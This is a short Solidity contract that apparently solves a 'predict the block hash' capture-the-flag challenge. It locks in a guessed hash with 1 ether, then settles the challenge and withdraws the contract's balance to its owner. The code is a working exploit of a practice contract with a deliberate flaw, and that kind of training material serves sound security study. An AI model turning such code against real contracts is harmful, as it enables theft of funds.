pragma solidity ^0.4.21;

import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashSolution {
  address owner;

  constructor() public {
    owner = msg.sender;
  }

  function step1(PredictTheBlockHashChallenge challenge, bytes32 hash) public payable {
    require(msg.value == 1 ether, "Missing 1 ether");
    challenge.lockInGuess.value(msg.value)(hash);
  }

  function step2(PredictTheBlockHashChallenge challenge) public {
    challenge.settle();
    withdraw();
  }

  function () public payable { }

  function withdraw() public {
    owner.transfer(address(this).balance);
  }
}
